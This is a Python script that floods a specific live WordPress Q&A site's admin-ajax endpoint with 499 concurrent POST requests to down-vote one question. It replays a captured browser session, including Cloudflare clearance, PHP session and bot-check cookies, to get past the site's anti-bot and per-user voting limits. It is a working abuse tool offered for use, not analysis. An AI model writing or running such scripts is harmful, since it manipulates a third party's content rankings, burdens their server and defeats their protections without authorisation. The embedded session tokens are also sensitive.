import requests
from threading import Thread

url = "https://askitsnp.com/wp-admin/admin-ajax.php"

payload = "action=wpqa_question_vote_up&id=22593"
payload = "action=wpqa_question_vote_down&id=22593"
headers = {
    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9",
    "content-length": "39",
    "content-type": "application/x-www-form-urlencoded",
    "cookie": "cf_clearance=fe_Pvp.y_.FTNljEI0lx11O91HW3qwT6siTeLAEdvjo-1649061362-0-150; PHPSESSID=066ce815dd52d399f74d0b59bd0099ae; icwp-wpsf-notbot=1649061665z26f996fdd85ed40a924e93afd2825c72a12e55d7; 85782wpqa_question_vote_up22593=deleted",##wpqa_yes
    "dnt": "1",
    "origin": "https://askitsnp.com",
    "referer": "https://askitsnp.com/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "sec-gpc": "1",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",
    "x-requested-with": "XMLHttpRequest"
}
def req():
    response = requests.request("POST", url, data=payload, headers=headers)
    print(response.text)


lis= []
for i in range(1,500):
    t= Thread(target=req)
    t.start()
    lis.append(t)

for i in lis:
    i.join()